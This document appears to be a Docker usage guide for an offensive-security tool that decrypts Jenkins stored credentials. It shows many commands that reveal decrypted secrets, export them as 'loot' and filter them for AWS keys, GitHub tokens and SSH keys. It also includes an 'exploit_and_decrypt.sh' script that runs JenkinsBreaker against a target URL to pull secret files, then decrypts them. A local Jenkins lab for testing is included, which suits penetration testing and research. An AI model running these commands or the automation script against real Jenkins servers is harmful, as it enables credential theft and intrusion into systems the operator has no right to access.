# Docker Usage Guide

## Overview

The tool supports Docker for portable execution across platforms without requiring local Python installation.

**Features**:
- Isolated container environment
- Volume mounts for Jenkins file access
- Environment variable configuration (no hardcoded credentials)
- Compatible with Windows/Linux/macOS

---

## Quick Start

### 1. Build the Image

```bash
docker-compose build offsec-jenkins
```

Or use Docker directly:
```bash
docker build -t offsec-jenkins:latest .
```

### 2. Prepare Jenkins Files

Place extracted Jenkins files in `./jenkins_files/`:
```
jenkins_files/
├── master.key
├── hudson.util.Secret
└── credentials.xml
```

### 3. Run Decryption

**Redacted output** (default):
```bash
docker-compose run --rm offsec-jenkins --path /data
```

**Revealed secrets** (authorized testing):
```bash
docker-compose run --rm offsec-jenkins --path /data --reveal-secrets
```

**Export to JSON**:
```bash
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-json /outputs/loot.json \
  --reveal-secrets \
  --force
```

Output files are written to `./outputs/` on the host machine.

---

## Usage Examples

### Example 1: Basic Decryption
```bash
# Place files in jenkins_files/
cp extracted/master.key jenkins_files/
cp extracted/hudson.util.Secret jenkins_files/
cp extracted/credentials.xml jenkins_files/

# Decrypt (redacted)
docker-compose run --rm offsec-jenkins --path /data
```

### Example 2: Export to JSON
```bash
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-json /outputs/loot.json \
  --reveal-secrets \
  --force

# Parse output
cat outputs/loot.json | jq '.[] | select(.decrypted | contains("AKIA"))'
```

### Example 3: Explicit File Paths
```bash
docker-compose run --rm offsec-jenkins \
  --key /data/master.key \
  --secret /data/hudson.util.Secret \
  --xml /data/credentials.xml \
  --reveal-secrets
```

### Example 4: Recursive Scanning
```bash
docker-compose run --rm offsec-jenkins \
  --scan-dir /data \
  --export-json /outputs/all_secrets.json \
  --reveal-secrets \
  --force
```

### Example 5: Dry-Run Mode
```bash
# Test without decrypting
docker-compose run --rm offsec-jenkins \
  --path /data \
  --dry-run
```

### Example 6: CSV Export
```bash
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-csv /outputs/report.csv \
  --reveal-secrets \
  --force
```

---

## Advanced Usage

### Using Docker Without docker-compose

**Build**:
```bash
docker build -t offsec-jenkins:latest .
```

**Run with volume mounts**:
```bash
docker run --rm \
  -v $(pwd)/jenkins_files:/data:ro \
  -v $(pwd)/outputs:/outputs \
  offsec-jenkins:latest \
  --path /data --reveal-secrets
```

**Windows PowerShell**:
```powershell
docker run --rm `
  -v ${PWD}/jenkins_files:/data:ro `
  -v ${PWD}/outputs:/outputs `
  offsec-jenkins:latest `
  --path /data --reveal-secrets
```

### Custom Volume Paths

Mount Jenkins files from any location:
```bash
docker run --rm \
  -v /path/to/jenkins/files:/data:ro \
  -v /path/to/output:/outputs \
  offsec-jenkins:latest \
  --path /data --export-json /outputs/loot.json --reveal-secrets
```

### Filtering Output

```bash
docker run --rm \
  -v $(pwd)/jenkins_loot:/data:ro \
  offsec-jenkins:latest \
  --path /data --reveal-secrets | grep -E "AKIA|ghp_|ssh-rsa"
```

---

## Jenkins Lab (Testing)

The docker-compose configuration includes an optional Jenkins instance for validation. No credentials are hardcoded.

### Start Jenkins Lab

```bash
docker-compose --profile lab up -d jenkins-lab
```

Access Jenkins at http://localhost:8080

**Initial Setup**:
1. Navigate to http://localhost:8080
2. Retrieve initial admin password:
   ```bash
   docker exec jenkins-lab cat /var/jenkins_home/secrets/initialAdminPassword
   ```
3. Complete setup wizard and configure admin credentials

### Configure Test Credentials

After login:
1. Navigate to **Manage Jenkins** → **Manage Credentials**
2. Add test credentials (AWS keys, GitHub tokens, SSH keys, passwords)
3. Extract Jenkins files:
   ```bash
   docker cp jenkins-lab:/var/jenkins_home/secrets/master.key jenkins_files/
   docker cp jenkins-lab:/var/jenkins_home/secrets/hudson.util.Secret jenkins_files/
   docker cp jenkins-lab:/var/jenkins_home/credentials.xml jenkins_files/
   ```
4. Run decryption:
   ```bash
   docker-compose run --rm offsec-jenkins --path /data --reveal-secrets
   ```

### Stop and Clean Up

```bash
# Stop Jenkins lab
docker-compose --profile lab down

# Remove volumes (destructive)
docker-compose --profile lab down -v
```

---

## Security Considerations

### Credential Handling

This configuration does not include default credentials. Users must configure credentials manually during Jenkins setup.

### OPSEC

**Default Redaction**:
- Secrets are redacted by default
- Requires explicit `--reveal-secrets` flag
- Prevents accidental exposure in logs

**Read-Only Mounts**:
- Input files mounted read-only (`:ro`)
- Original Jenkins files remain unmodified
- Suitable for forensic analysis

**Container Isolation**:
- Decryption occurs in isolated container
- No host system dependencies required
- Clean removal with `docker-compose down`

---

## Troubleshooting

### Permission Denied on Output Files

Run with specific user ID:
```bash
docker run --rm \
  -v $(pwd)/jenkins_files:/data:ro \
  -v $(pwd)/outputs:/outputs \
  --user $(id -u):$(id -g) \
  offsec-jenkins:latest \
  --path /data --export-json /outputs/loot.json --reveal-secrets
```

### Files Not Found

Verify volume mount:
```bash
docker run --rm -v $(pwd)/jenkins_files:/data:ro alpine ls -la /data
```

Expected output:
```
master.key
hudson.util.Secret
credentials.xml
```

### Docker Not Available

Use native Python:
```bash
python decrypt.py --path jenkins_files --reveal-secrets
```

---

## Integration with JenkinsBreaker

### Workflow

**Step 1**: Extract files with JenkinsBreaker
```bash
cd JenkinsBreaker
python3 JenkinsBreaker.py --url http://target:8080 --extract-all
```

**Step 2**: Copy to Docker volume
```bash
cp extracted/* ../offsec-jenkins/jenkins_files/
```

**Step 3**: Decrypt
```bash
cd ../offsec-jenkins
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-json /outputs/loot.json \
  --reveal-secrets \
  --force
```

**Step 4**: Analyze
```bash
cat outputs/loot.json | jq '.'
```

### Automation Script

`exploit_and_decrypt.sh`:
```bash
#!/bin/bash
TARGET=$1

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <jenkins-url>"
  exit 1
fi

cd JenkinsBreaker
python3 JenkinsBreaker.py --url "$TARGET" --extract-all --output ../offsec-jenkins/jenkins_files

cd ../offsec-jenkins
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-json /outputs/loot_$(date +%Y%m%d_%H%M%S).json \
  --reveal-secrets \
  --force

echo "Decryption complete. Check outputs/ directory."
```

Usage:
```bash
chmod +x exploit_and_decrypt.sh
./exploit_and_decrypt.sh http://target-jenkins:8080
```

---

## Platform Compatibility

| Platform | Status | Notes |
|----------|--------|-------|
| Linux | Supported | Native Docker |
| macOS | Supported | Docker Desktop |
| Windows | Supported | Docker Desktop or WSL2 |
| WSL2 | Supported | Linux or Windows Docker |
| Kali Linux | Supported | Native Docker |
| Parrot OS | Supported | Native Docker |

---

## Performance Notes

- Build time: ~30 seconds
- Container startup: <1 second
- Decryption speed: Equivalent to native Python
- Memory overhead: ~50MB
